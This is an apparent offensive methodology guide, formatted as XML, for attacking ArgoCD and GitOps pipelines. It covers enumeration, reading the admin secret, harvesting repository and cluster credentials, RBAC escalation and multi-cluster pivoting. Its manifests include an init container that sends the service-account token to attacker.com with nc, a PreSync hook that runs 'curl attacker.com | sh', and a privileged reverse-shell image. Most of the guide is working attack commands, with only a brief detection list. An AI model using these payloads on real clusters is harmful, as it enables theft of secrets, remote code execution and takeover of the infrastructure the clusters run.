<vulnerability_guide>
  <title>ARGOCD AND GITOPS ATTACKS</title>

  <critical>ArgoCD is the most widely deployed GitOps tool, managing Kubernetes deployments declaratively from Git repositories. Compromising ArgoCD means controlling what runs in Kubernetes clusters. A single ArgoCD misconfiguration can grant cluster-admin across all managed clusters.</critical>

  <scope>
    - ArgoCD authentication bypass
    - Repository access exploitation
    - Kubernetes manifest manipulation
    - Secret management weaknesses
    - RBAC and permission escalation
    - Multi-cluster attack chains
  </scope>

  <methodology>
    1. ARGOCD ENUMERATION
       {% raw %}
       # Find ArgoCD instances
       # Common URLs
       https://argocd.target.com
       https://argo.target.com
       https://cd.target.com
       /argocd

       # Default ports
       # 80/443 - Web UI
       # 8080 - API server
       # 8083 - Metrics

       # API enumeration (unauthenticated)
       curl https://argocd.target.com/api/version
       curl https://argocd.target.com/api/v1/settings

       # Check for SSO configuration
       curl https://argocd.target.com/api/v1/settings | jq '.dexConfig'
       {% endraw %}

    2. AUTHENTICATION ATTACKS
       {% raw %}
       # Default credentials
       # admin / argocd-initial-admin-secret (Kubernetes secret)

       # Password from secret
       kubectl get secret argocd-initial-admin-secret -n argocd -o jsonpath='{.data.password}' | base64 -d

       # SSO bypass attempts
       # Check for misconfigurations in OIDC/SAML
       # Look for group mapping issues

       # JWT token attacks
       # ArgoCD uses JWT for sessions
       # Check for weak secrets, algorithm confusion

       # API token enumeration
       argocd account list
       argocd account get-user-info
       {% endraw %}

    3. REPOSITORY ACCESS EXPLOITATION
       {% raw %}
       # ArgoCD stores repo credentials
       # If you have ArgoCD access:

       # List repositories
       argocd repo list

       # Get repository credentials (if admin)
       kubectl get secrets -n argocd -l argocd.argoproj.io/secret-type=repository

       # Credential harvesting
       # Repo credentials stored as Kubernetes secrets
       # May include Git tokens, SSH keys

       # Attack vector: Compromise repo to modify manifests
       # All clusters syncing from repo get malicious deployments
       {% endraw %}

    4. MANIFEST INJECTION
       {% raw %}
       # If you can modify Git repository:

       # Inject malicious container
       # deployment.yaml
       spec:
         containers:
         - name: malicious
           image: attacker/reverse-shell
           securityContext:
             privileged: true

       # Inject init container for secrets
       spec:
         initContainers:
         - name: secret-stealer
           image: alpine
           command: ["/bin/sh", "-c"]
           args: ["cat /var/run/secrets/kubernetes.io/serviceaccount/token | nc attacker.com 4444"]

       # Modify ConfigMaps/Secrets
       # Inject environment variables
       # Modify service endpoints
       {% endraw %}

    5. RBAC ESCALATION
       {% raw %}
       # ArgoCD RBAC policies
       # Check current permissions
       argocd account can-i sync applications '*'
       argocd account can-i get applications '*'

       # Default RBAC issues
       # - readonly role can still see secrets
       # - project admin can deploy to any namespace

       # Project misconfigurations
       argocd proj list
       argocd proj get <project>

       # Check for:
       # - destinations: * (any cluster/namespace)
       # - clusterResourceWhitelist: * (any resource type)
       # - sourceRepos: * (any repository)
       {% endraw %}
  </methodology>

  <advanced_techniques>
    <applicationset_abuse>
      {% raw %}
      # ApplicationSets auto-generate applications
      # Can be abused for mass deployment

      # Git generator exploitation
      # If ApplicationSet uses Git generator with user input
      apiVersion: argoproj.io/v1alpha1
      kind: ApplicationSet
      spec:
        generators:
        - git:
            repoURL: https://github.com/org/repo
            revision: HEAD
            directories:
            - path: apps/*  # Attacker creates malicious dir

      # Matrix generator for multi-cluster
      # Single compromise affects all clusters
      {% endraw %}
    </applicationset_abuse>

    <helm_value_injection>
      {% raw %}
      # Helm-based applications accept values
      # Check for injection in values

      # Through ArgoCD UI/API
      argocd app set myapp --helm-set 'image=attacker/malicious'

      # Values file manipulation in Git
      # values.yaml injection points:
      # - image tags
      # - command/args
      # - environment variables
      # - resource requests (for DoS)
      {% endraw %}
    </helm_value_injection>

    <sync_window_bypass>
      {% raw %}
      # ArgoCD sync windows restrict when deploys happen
      # But can be bypassed:

      # 1. Direct kubectl if you have cluster access
      # 2. Manual sync with --force (if permitted)
      # 3. Modify sync window policy itself

      # Check sync windows
      argocd proj windows list <project>
      {% endraw %}
    </sync_window_bypass>

    <resource_hooks>
      {% raw %}
      # ArgoCD resource hooks run at sync time
      # Can execute arbitrary commands

      # Pre-sync hook (runs before app sync)
      apiVersion: batch/v1
      kind: Job
      metadata:
        annotations:
          argocd.argoproj.io/hook: PreSync
      spec:
        template:
          spec:
            containers:
            - name: exploit
              image: alpine
              command: ["sh", "-c", "curl attacker.com | sh"]

      # Hook phases: PreSync, Sync, PostSync, SyncFail
      {% endraw %}
    </resource_hooks>

    <multi_cluster_pivoting>
      {% raw %}
      # ArgoCD often manages multiple clusters
      # Compromise one, pivot to others

      # List managed clusters
      argocd cluster list

      # Get cluster credentials (admin)
      kubectl get secrets -n argocd -l argocd.argoproj.io/secret-type=cluster

      # Deploy to different cluster
      argocd app create exploit \
        --repo https://attacker.com/exploit \
        --path . \
        --dest-server https://target-cluster \
        --dest-namespace default
      {% endraw %}
    </multi_cluster_pivoting>
  </advanced_techniques>

  <detection>
    - Monitor ArgoCD audit logs for unusual syncs
    - Alert on new repository additions
    - Track RBAC policy changes
    - Monitor for application creates/deletes
    - Check for credential secret access
  </detection>

  <validation>
    - Successfully authenticate to ArgoCD
    - Extract repository credentials
    - Deploy malicious application
    - Escalate RBAC permissions
    - Access multiple clusters
  </validation>

  <pro_tips>
    - ArgoCD Application resources are often in-cluster - kubectl can manage them
    - Check for repo-server exec permissions (CVE-2022-24348)
    - ApplicationSets with SCM generators can be weaponized
    - ArgoCD image updater may have excessive permissions
    - Notifications controller can leak secrets via webhooks
  </pro_tips>

  <remember>ArgoCD is a force multiplier - controlling it means controlling every cluster and application it manages. Focus on repository access first (Git credentials), then ArgoCD RBAC, then cluster credentials. A single malicious commit to a synced repository can compromise the entire infrastructure.</remember>
</vulnerability_guide>
